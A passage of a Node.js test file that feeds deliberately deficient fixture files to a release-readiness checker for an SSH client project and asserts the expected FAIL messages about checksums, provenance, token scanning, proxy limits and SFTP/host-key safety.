    result.stdout,
    /FAIL Web Admin tests cover oversized live snapshot body rejection/,
  );
});

test("rejects Web Admin proxy examples without an upstream response size cap", (t) => {
  const result = runChecker(
    createFixture(t, {
      "deploy/web-admin/node-admin-snapshot-proxy.mjs":
        "ATLASTERM_WEB_ADMIN_PROXY_ALLOW_PUBLIC_BIND ATLASTERM_WEB_ADMIN_PROXY_OPERATOR_TOKEN isAuthorizedBearer timingSafeEqual isLoopbackHost await upstreamResponse.text()\n",
      "scripts/smoke-web-admin-proxy.mjs":
        "assertPublicBindFailsClosed assertPublicBindRequiresOperatorToken assertPublicBindRequiresOperatorAuthorization ATLASTERM_WEB_ADMIN_PROXY_ALLOW_PUBLIC_BIND=1\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Web Admin proxy caps upstream admin snapshot response bytes before forwarding/,
  );
  assert.match(
    result.stdout,
    /FAIL Web Admin proxy smoke covers public-bind startup rejection, operator auth, and oversized upstream snapshots/,
  );
});

test("rejects missing Web Admin snapshot ops status surface", (t) => {
  const result = runChecker(
    createFixture(t, {
      "apps/web/src/main.tsx": appShellFixture("web").replace(
        "snapshotStatus",
        "snapshot-state",
      ),
      "apps/web/src/localization.ts":
        "const SHARED_MESSAGES = {}; return SHARED_MESSAGES[key];\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Web Admin UI surfaces snapshot health and refresh metadata/,
  );
  assert.match(
    result.stdout,
    /FAIL Web Admin localization includes snapshot ops status fallback copy/,
  );
});

test("rejects Desktop release metadata that drifts from Tauri config", (t) => {
  const result = runChecker(
    createFixture(t, {
      "docs/desktop-release-metadata.json": JSON.stringify({
        productName: "WrongSSH",
        identifier: "dev.atlasterm.other",
        publisher: "",
        copyright: "",
        category: "",
        bundleTargets: ["windows"],
        signingEvidence: {},
        linuxPackageTypes: [],
      }),
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Desktop release metadata productName matches Tauri config/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop release metadata identifier matches Tauri config/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop release metadata includes publisher/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop release metadata documents signing evidence environment variables/,
  );
});

test("rejects Desktop checksum scripts that bypass release evidence packaging", (t) => {
  const result = runChecker(
    createFixture(t, {
      "package.json": JSON.stringify({
        version: "0.1.0-beta.1",
        scripts: Object.fromEntries(
          [
            "qa:release:public",
            "qa:prod-audit",
            "qa:lighthouse",
            "qa:rust-advisory",
            "qa:web-admin-proxy-smoke",
            "qa:web-admin-sync-topology-smoke",
            "qa:web-admin-sync-topology-release-smoke",
            "qa:e2e:web-real-sync",
            "qa:e2e:web-real-sync:fresh",
            "qa:sync:backup-restore-smoke",
            "qa:sync:config-guard-smoke",
            "qa:sync:self-hosted-smoke",
            "qa:sync:release-smoke",
            "qa:tauri",
            "test:desktop-release-package",
            "qa:desktop-release-package",
            "test:desktop-release-evidence",
            "qa:desktop-release-evidence",
            "test:web-release",
            "qa:web-release",
            "test:release-sbom",
            "test:release-publish-preflight",
            "test:release-provenance",
            "test:release-readiness",
            "test:web-admin-bundle-token-scan",
            "test:sync-release-package",
            "test:sync-release-evidence",
            "test:web-release-verify",
            "qa:release-sbom",
            "qa:release-publish-preflight",
            "qa:release-provenance",
            "qa:release-readiness",
            "qa:web-admin-bundle-token-scan",
            "qa:sync-release-package",
            "qa:sync-release-evidence",
            "qa:sync:release-backup-restore-smoke",
            "release:desktop:build",
            "release:desktop:package",
            "release:desktop:checksums",
            "release:desktop:verify-evidence",
            "release:desktop:draft",
            "release:publish-preflight",
            "release:provenance",
            "release:provenance:verify",
            "release:verify-checksums",
            "release:sbom",
            "release:sbom:verify",
            "release:sync",
            "release:web",
          ].map((name) => [
            name,
            fixtureScriptValue(name, {
              "release:desktop:checksums":
                "node scripts/generate-artifact-checksums.mjs --output reports/release/desktop/SHA256SUMS.txt apps/desktop/src-tauri/target/release/bundle",
            }),
          ]),
        ),
      }),
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Desktop checksum script uses release packaging evidence flow/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop checksum script does not bypass Desktop release evidence/,
  );
});

test("rejects release checksum gates that do not discover all staged manifests", (t) => {
  const result = runChecker(
    createFixture(t, {
      "package.json": JSON.stringify({
        version: "0.1.0-beta.1",
        scripts: Object.fromEntries(
          [
            "qa:release:public",
            "qa:prod-audit",
            "qa:lighthouse",
            "qa:rust-advisory",
            "qa:web-admin-proxy-smoke",
            "qa:web-admin-sync-topology-smoke",
            "qa:web-admin-sync-topology-release-smoke",
            "qa:e2e:web-real-sync",
            "qa:e2e:web-real-sync:fresh",
            "qa:sync:backup-restore-smoke",
            "qa:sync:config-guard-smoke",
            "qa:sync:self-hosted-smoke",
            "qa:sync:release-smoke",
            "qa:tauri",
            "test:desktop-release-package",
            "qa:desktop-release-package",
            "test:desktop-release-evidence",
            "qa:desktop-release-evidence",
            "test:web-release",
            "qa:web-release",
            "test:release-sbom",
            "test:release-publish-preflight",
            "test:release-provenance",
            "test:release-readiness",
            "test:web-admin-bundle-token-scan",
            "test:sync-release-package",
            "test:sync-release-evidence",
            "test:web-release-verify",
            "qa:release-sbom",
            "qa:release-publish-preflight",
            "qa:release-provenance",
            "qa:release-readiness",
            "qa:web-admin-bundle-token-scan",
            "qa:sync-release-package",
            "qa:sync-release-evidence",
            "qa:sync:release-backup-restore-smoke",
            "release:desktop:build",
            "release:desktop:package",
            "release:desktop:checksums",
            "release:desktop:verify-evidence",
            "release:desktop:draft",
            "release:publish-preflight",
            "release:provenance",
            "release:provenance:verify",
            "release:verify-checksums",
            "release:sbom",
            "release:sbom:verify",
            "release:sync",
            "release:web",
          ].map((name) => [
            name,
            fixtureScriptValue(name, {
              "release:verify-checksums":
                "node scripts/verify-artifact-checksums.mjs reports/release/desktop/SHA256SUMS.txt reports/release/web/SHA256SUMS.txt reports/release/sync/SHA256SUMS.txt reports/release/SBOM-SHA256SUMS.txt",
            }),
          ]),
        ),
      }),
      "scripts/release-publish-preflight.mjs":
        "Verify release Git checkout rev-parse --porcelain=v1 :(exclude)reports/release must point at HEAD for publish preflight verify-web-release-package.mjs verify-sync-release-evidence.mjs verify-artifact-checksums.mjs reports/release/desktop/SHA256SUMS.txt reports/release/web/SHA256SUMS.txt reports/release/sync/SHA256SUMS.txt reports/release/SBOM-SHA256SUMS.txt\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Release checksum script verifies all staged release checksum manifests/,
  );
  assert.match(
    result.stdout,
    /FAIL Publish preflight verifies all staged release checksum manifests/,
  );
});

test("rejects publish preflight scripts without release Git checks", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/release-publish-preflight.mjs":
        "verify-web-release-package.mjs verify-sync-release-evidence.mjs verify-artifact-checksums.mjs --all-release\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Publish preflight verifies healthy Git checkout, clean tree, and release tag/,
  );
});

test("rejects publish preflight scripts without staged Web Admin package verification", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/release-publish-preflight.mjs":
        "Verify release Git checkout rev-parse --porcelain=v1 :(exclude)reports/release must point at HEAD for publish preflight verify-sync-release-evidence.mjs verify-artifact-checksums.mjs --all-release\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Publish preflight verifies the staged Web Admin release package/,
  );
});

test("rejects publish preflight scripts without Sync evidence verification", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/release-publish-preflight.mjs":
        "Verify release Git checkout rev-parse --porcelain=v1 :(exclude)reports/release must point at HEAD for publish preflight verify-web-release-package.mjs verify-artifact-checksums.mjs --all-release\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Publish preflight verifies Sync packaged backup\/restore release evidence/,
  );
});

test("rejects publish preflight scripts without release provenance verification", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/release-publish-preflight.mjs":
        "Verify release Git checkout rev-parse --porcelain=v1 :(exclude)reports/release must point at HEAD for publish preflight verify-web-release-package.mjs verify-sync-release-evidence.mjs verify-artifact-checksums.mjs --all-release\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Publish preflight verifies release provenance/,
  );
});

test("rejects public release scripts without Lighthouse release-machine gate", (t) => {
  const result = runChecker(
    createFixture(t, {
      "package.json": JSON.stringify({
        version: "0.1.0-beta.1",
        scripts: Object.fromEntries(
          releaseScriptNames.map((name) => [
            name,
            fixtureScriptValue(name, {
              "qa:release:public":
                "npm run qa:rust-advisory && npm run qa:web-admin-sync-topology-release-smoke",
            }),
          ]),
        ),
      }),
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Public release QA runs Web Admin Lighthouse on the release machine/,
  );
});

test("rejects public release scripts without required real Desktop SSH smoke fixture", (t) => {
  const scripts = Object.fromEntries(
    releaseScriptNames.map((name) => [name, fixtureScriptValue(name)]),
  );
  scripts["qa:release:public"] =
    "npm run qa:mobile-public-env && npm run qa:rust-advisory && npm run qa:lighthouse && npm run qa:web-admin-sync-topology-release-smoke && npm run qa:sync:release-backup-restore-smoke && npm run qa:sync:backup-restore-smoke && node scripts/verify-sync-release-evidence.mjs";
  scripts["qa:release:public:local"] =
    "npm run qa:mobile-public-env && npm run qa:rust-advisory && npm run qa:lighthouse && npm run qa:web-admin-sync-topology-release-smoke && npm run qa:sync:release-backup-restore-smoke && npm run qa:sync:backup-restore-smoke && node scripts/verify-sync-release-evidence.mjs";

  const result = runChecker(
    createFixture(t, {
      "package.json": JSON.stringify({
        version: "0.1.0-beta.1",
        scripts,
      }),
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Public release QA requires real Desktop SSH smoke fixture/,
  );
  assert.match(
    result.stdout,
    /FAIL Local public release QA requires real Desktop SSH smoke fixture/,
  );
});

test("rejects public release scripts without mobile public env gate", (t) => {
  const scripts = Object.fromEntries(
    releaseScriptNames.map((name) => [name, fixtureScriptValue(name)]),
  );
  scripts["qa:release:public"] =
    "npm run qa:rust-advisory && npm run qa:lighthouse && npm run qa:web-admin-sync-topology-release-smoke && npm run qa:sync:release-backup-restore-smoke && npm run qa:sync:backup-restore-smoke && node scripts/verify-sync-release-evidence.mjs";
  scripts["qa:release:public:local"] =
    "npm run qa:rust-advisory && npm run qa:lighthouse && npm run qa:web-admin-sync-topology-release-smoke && npm run qa:sync:release-backup-restore-smoke && npm run qa:sync:backup-restore-smoke && node scripts/verify-sync-release-evidence.mjs";

  const result = runChecker(
    createFixture(t, {
      "package.json": JSON.stringify({
        version: "0.1.0-beta.1",
        scripts,
      }),
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Public release QA rejects mobile public bearer-token env/,
  );
  assert.match(
    result.stdout,
    /FAIL Local public release QA rejects mobile public bearer-token env/,
  );
});

test("rejects public release scripts that do not verify Sync release evidence after local smokes", (t) => {
  const scripts = Object.fromEntries(
    releaseScriptNames.map((name) => [name, fixtureScriptValue(name)]),
  );
  scripts["qa:release:public"] =
    "npm run qa:rust-advisory && npm run qa:lighthouse && npm run qa:web-admin-sync-topology-release-smoke && npm run qa:sync:release-backup-restore-smoke && node scripts/verify-sync-release-evidence.mjs && npm run qa:sync:backup-restore-smoke";
  scripts["qa:release:public:local"] =
    "npm run qa:rust-advisory && npm run qa:lighthouse && npm run qa:web-admin-sync-topology-release-smoke && npm run qa:sync:release-backup-restore-smoke && npm run qa:sync:backup-restore-smoke";
  const result = runChecker(
    createFixture(t, {
      "package.json": JSON.stringify({
        version: "0.1.0-beta.1",
        scripts,
      }),
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Public release QA verifies Sync packaged release evidence after local Sync smokes/,
  );
  assert.match(
    result.stdout,
    /FAIL Local public release QA verifies Sync packaged release evidence after local Sync smokes/,
  );
});

test("rejects root QA scripts that use non-fresh E2E", (t) => {
  const result = runChecker(
    createFixture(t, {
      "package.json": JSON.stringify({
        version: "0.1.0-beta.1",
        scripts: Object.fromEntries(
          releaseScriptNames.map((name) => [
            name,
            fixtureScriptValue(name, {
              qa: "npm run lint && npm run qa:e2e",
            }),
          ]),
        ),
      }),
    }),
  );

  assert.equal(result.status, 1);
  assert.match(result.stdout, /FAIL Root QA runs E2E on fresh local ports/);
  assert.match(result.stdout, /FAIL Root QA avoids non-fresh E2E server reuse/);
});

test("rejects CI E2E jobs that use non-fresh E2E", (t) => {
  const result = runChecker(
    createFixture(t, {
      ".github/workflows/ci.yml": ciFixture().replace(
        "npm run qa:e2e:fresh",
        "npm run qa:e2e",
      ),
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL CI public release gate runs 'npm run qa:e2e:fresh'/,
  );
  assert.match(
    result.stdout,
    /FAIL CI E2E job avoids non-fresh E2E server reuse/,
  );
});

test("rejects release provenance tooling without Git and manifest binding", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/generate-release-provenance.mjs":
        "writeFileSync('reports/release/release-provenance.json', '{}')\n",
      "scripts/verify-release-provenance.mjs": "console.log('ok')\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Release provenance generator binds Git, lockfiles, manifests, and provenance checksum evidence/,
  );
  assert.match(
    result.stdout,
    /FAIL Release provenance verifier rejects stale Git, release notes, lockfile, manifest, and artifact evidence/,
  );
});

test("rejects Rust SSH dependencies that re-enable vulnerable RSA feature", (t) => {
  const result = runChecker(
    createFixture(t, {
      "crates/core/Cargo.toml":
        'russh = { version = "0.61", default-features = false, features = ["ring", "flate2", "rsa"] }\n',
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Rust SSH dependency keeps vulnerable RSA feature disabled for Public Beta/,
  );
});

test("rejects Desktop release package scripts that do not require all public platforms", (t) => {
  const result = runChecker(
    createFixture(t, {
      "package.json": JSON.stringify({
        version: "0.1.0-beta.1",
        scripts: Object.fromEntries(
          releaseScriptNames.map((name) => [
            name,
            fixtureScriptValue(name, {
              "release:desktop:package":
                "node scripts/package-desktop-release.mjs",
            }),
          ]),
        ),
      }),
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Desktop release package script requires Windows, macOS, and Linux artifacts by default/,
  );
});

test("rejects Desktop release evidence tooling without artifact hash binding", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/package-desktop-release.mjs":
        "createEvidenceEntry(path, classification)\n",
      "scripts/verify-desktop-release-evidence.mjs":
        "requireNonEmptyString(label, artifact, 'signatureVerification')\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Desktop release packager records artifact SHA256 in release evidence/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop release evidence verifier recomputes artifact hashes from disk/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop release evidence verifier binds artifact SHA256 to the checksum manifest/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop release evidence verifier binds release evidence JSON to its checksum manifest/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop release evidence verifier binds signing proof text to artifact identity/,
  );
});

test("rejects Desktop release workflow without macOS DMG failure diagnostics", (t) => {
  const result = runChecker(
    createFixture(t, {
      ".github/workflows/desktop-release-artifacts.yml":
        "Build Desktop bundle\n",
      "scripts/download-desktop-release-evidence.mjs":
        "Package Formal Desktop Evidence --run-id is required verify-desktop-release-evidence.mjs artifact.expired reports/release/desktop/\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Desktop formal evidence downloader imports only verified workflow evidence/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop release workflow preserves macOS DMG failure diagnostics/,
  );
});

test("rejects release draft tooling that uploads raw Tauri bundle artifacts", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/create-github-release-draft.mjs":
        'const candidates = [resolve(root, "reports", "release"), resolve(root, "apps", "desktop", "src-tauri", "target", "release", "bundle")];\n',
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL GitHub Release draft uploads only staged reports\/release artifacts/,
  );
});

test("rejects narrow Web Admin bundle token scanners", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/check-web-admin-bundle-token-scan.mjs":
        "VITE_ATLASTERM_ADMIN_SNAPSHOT_AUTH_TOKEN atlasterm-admin-snapshot-sentinel-token\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Web Admin bundle token scan rejects token env names, bearer literals, and high-entropy credential literals/,
  );
});

test("rejects narrow mobile public env guards", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/check-mobile-public-env.mjs": "console.log('ok');\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Mobile public env guard rejects EXPO_PUBLIC sync auth tokens/,
  );
});

test("rejects Web Admin release packagers without output path guards", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/package-web-release.mjs":
        "writeFileSync(outputPath, archive);\nwriteFileSync(checksumPath, manifest);\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Web Admin release packager keeps output paths inside the release root/,
  );
});

test("rejects Sync release packagers without stale binary cleanup", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/package-sync-release.mjs":
        "copyFileSync(sourceBinary, releaseBinary);\nwriteFileSync(checksumPath, 'SHA256SUMS.txt');\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Sync release packager removes stale staged binaries while writing checksums/,
  );
});

test("rejects Sync backup/restore smokes without separated local and release evidence", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/smoke-sync-backup-restore.mjs": "binaryKind binarySha256\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Sync backup\/restore smoke separates local drill evidence from packaged release evidence/,
  );
});

test("rejects Lighthouse audit scripts without Web Admin release-machine evidence", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/lighthouse-audit.mjs":
        '"desktop" apps", "desktop", "dist reports", "lighthouse", "desktop.json defaultThresholds\n',
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Lighthouse release audit targets Web Admin dist, applies deployment headers, uses explicit fixture mode, serves a local admin snapshot fallback, fails on run warnings, and writes release-machine evidence/,
  );
});

test("rejects Web Admin topology smokes without staged Sync release binary support", (t) => {
  const result = runChecker(
    createFixture(t, {
      "scripts/smoke-web-admin-sync-release-topology.mjs":
        "assertWebDist startStaticReleaseServer node-admin-snapshot-proxy.mjs ATLASTERM_SYNC_CORS_ORIGINS assertTopologyEmptySnapshot seedSyncData /v1/devices/register /v1/sync/push assertTopologyPopulatedSnapshot activeMembers healthyDevices assertProxyReplacesBrowserAuthorization assertTopologyAdminTokenError\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Web Admin \+ Sync release topology smoke supports staged Sync release binary verification/,
  );
});

test("rejects Sync Dockerfiles without a container healthcheck", (t) => {
  const result = runChecker(
    createFixture(t, {
      "docs/self-hosting-sync.md":
        "ATLASTERM_SYNC_AUTH_TOKEN ATLASTERM_SYNC_METRICS_TOKEN ATLASTERM_SYNC_ALLOW_EPHEMERAL_STORAGE 32 characters /readyz /metrics schema_version: 1 qa:sync:config-guard-smoke ledger.lock joessh_sync_storage_write_failures_total qa:sync:backup-restore-smoke RPO RTO systemd Docker Authorization: Bearer ${ATLASTERM_SYNC_METRICS_TOKEN} qa:sync-release-package qa:sync:release-smoke\n",
      "services/sync/Dockerfile":
        'ENV ATLASTERM_SYNC_STORAGE_PATH=/var/lib/joessh-sync/ledger.json\nVOLUME ["/var/lib/joessh-sync"]\n',
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Sync self-hosting guide mentions 'HEALTHCHECK'/,
  );
  assert.match(
    result.stdout,
    /FAIL Sync service Dockerfile declares a container healthcheck/,
  );
});

test("rejects self-hosting metrics restore docs without metrics token auth", (t) => {
  const result = runChecker(
    createFixture(t, {
      "docs/self-hosting-sync.md":
        "ATLASTERM_SYNC_AUTH_TOKEN ATLASTERM_SYNC_METRICS_TOKEN ATLASTERM_SYNC_ALLOW_EPHEMERAL_STORAGE 32 characters /readyz /metrics schema_version: 1 qa:sync:config-guard-smoke ledger.lock joessh_sync_storage_write_failures_total qa:sync:backup-restore-smoke RPO RTO systemd Docker HEALTHCHECK qa:sync-release-package qa:sync:release-smoke\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Sync self-hosting guide mentions 'Authorization: Bearer \$\{ATLASTERM_SYNC_METRICS_TOKEN\}'/,
  );
});

test("rejects missing repository release handoff playbook", (t) => {
  const result = runChecker(
    createFixture(t, {
      "docs/repository-release-handoff.md": "",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Repository release handoff playbook mentions 'healthy Git checkout'/,
  );
  assert.match(
    result.stdout,
    /FAIL Repository release handoff playbook mentions 'git fsck --strict'/,
  );
});

test("rejects stale changelog test-count and absolute coverage claims", (t) => {
  const result = runChecker(
    createFixture(t, {
      "CHANGELOG.md":
        "[0.1.0-beta.1]\n- Updated README with current test count (600).\n- Raised coverage thresholds to 100%.\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL CHANGELOG avoids stale fixed test-count or 100% coverage claims/,
  );
});

test("rejects stale public-facing branding and audit wording", (t) => {
  const result = runChecker(
    createFixture(t, {
      "README.md":
        "# JoeSSH\n[CI](https://github.com/atlasterm/atlasterm/actions/workflows/ci.yml)\nTeam/admin console skeleton\nSecurity audit: npm audit + audit-ci\n",
      ".env.example": "# AtlasTerm Environment Variables\n",
      LICENSE: "Copyright (c) 2026 AtlasTerm\n",
      "ARCHITECTURE.md": "Security gate: npm audit + audit-ci\n",
      "apps/desktop/public/llms.txt":
        "# AtlasTerm Workbench\n\nAtlasTerm is a local-first remote workbench.\n",
      "apps/desktop/public/humans.txt": "AtlasTerm Team\n",
      "apps/desktop/public/sw.js": 'const CACHE_NAME = "atlasterm-v1";\n',
      "apps/web/public/humans.txt": "AtlasTerm Team\n",
      "apps/web/public/sw.js": "const CACHE_NAME = 'atlasterm-admin-v1';\n",
      "services/sync/Cargo.toml":
        'version = "0.1.0-beta.1"\ndescription = "AtlasTerm sync service API"\n',
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL README public release text avoids stale 'github\.com\/atlasterm\/atlasterm'/,
  );
  assert.match(
    result.stdout,
    /FAIL README public release text avoids stale 'Team\/admin console skeleton'/,
  );
  assert.match(
    result.stdout,
    /FAIL README public release text avoids stale 'npm audit \+ audit-ci'/,
  );
  assert.match(
    result.stdout,
    /FAIL \.env example public release text avoids stale 'AtlasTerm Environment Variables'/,
  );
  assert.match(
    result.stdout,
    /FAIL License public release text avoids stale 'Copyright \(c\) 2026 AtlasTerm'/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop llms\.txt public release text avoids stale 'AtlasTerm Workbench'/,
  );
  assert.match(
    result.stdout,
    /FAIL Web service worker public release text avoids stale 'atlasterm-admin-v1'/,
  );
  assert.match(
    result.stdout,
    /FAIL Architecture public release text avoids stale 'npm audit \+ audit-ci'/,
  );
});

test("rejects missing Desktop host-key confirmation trust surface", (t) => {
  const result = runChecker(
    createFixture(t, {
      "apps/desktop/src/ConnectModal.tsx":
        "export function ConnectModal() { return null; }\n",
      "apps/desktop/src/panels.tsx":
        "export function SettingsPanel() { return null; }\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Desktop connect modal host-key confirmation UX includes 'onHostKeyProbe'/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop connect modal host-key confirmation UX includes 'desktop\.trustHostKeyAndConnect'/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop settings known-host management UX includes 'knownHosts\.entries'/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop settings known-host management UX includes 'desktop\.removeKnownHost'/,
  );
});

test("rejects missing Desktop PTY resize and reconnect runtime surface", (t) => {
  const result = runChecker(
    createFixture(t, {
      "crates/core/src/ssh.rs": "pub async fn probe_host_key() {}\n",
      "apps/desktop/src/XtermTerminal.tsx":
        "export function XtermTerminal() { return null; }\n",
      "apps/desktop/src/usePtySession.ts":
        "export function usePtySession() { return { status: 'open' }; }\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Desktop SSH exec output resource limit includes 'SSH_EXEC_MAX_OUTPUT_BYTES'/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop xterm PTY runtime UX includes 'ResizeObserver'/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop PTY lifecycle hook includes 'exitCode'/,
  );
});

test("rejects missing Desktop SFTP overwrite and path safety surface", (t) => {
  const result = runChecker(
    createFixture(t, {
      "apps/desktop/src/panels.tsx":
        "export function SftpPanel() { return null; }\n",
      "apps/desktop/src/sftpRemotePath.ts":
        "export function normalizeSftpRemotePath() { return '/'; }\n",
      "apps/desktop/src/useSftpTransfer.ts":
        "export function useSftpTransfer() { return {}; }\n",
      "apps/desktop/src-tauri/src/lib.rs": "fn sftp_read() {}\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Desktop SFTP overwrite confirmation UX includes 'desktop\.sftpOverwriteTitle'/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop SFTP remote path safety helpers includes 'joinSftpRemotePath'/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop SFTP remote path safety helpers includes 'joinSftpRemoteEntryPath'/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop SFTP transfer resource limit hook includes 'SFTP_TRANSFER_MAX_BYTES'/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop SFTP transfer resource limit backend includes 'SFTP_MAX_TRANSFER_BYTES'/,
  );
});

test("rejects missing Desktop forwarding single-flight runtime surface", (t) => {
  const result = runChecker(
    createFixture(t, {
      "apps/desktop/src/useForwardRules.ts":
        "export function useForwardRules() { return { runtime: {} }; }\n",
      "apps/desktop/src/panels.tsx":
        "export function ForwardingPanel() { return null; }\n",
    }),
  );

  assert.equal(result.status, 1);
  assert.match(
    result.stdout,
    /FAIL Desktop forwarding single-flight runtime hook includes 'inFlightRules'/,
  );
  assert.match(
    result.stdout,
    /FAIL Desktop forwarding pending action UX includes 'disabled=\{!forwards \|\| isPending\}'/,
  );
});
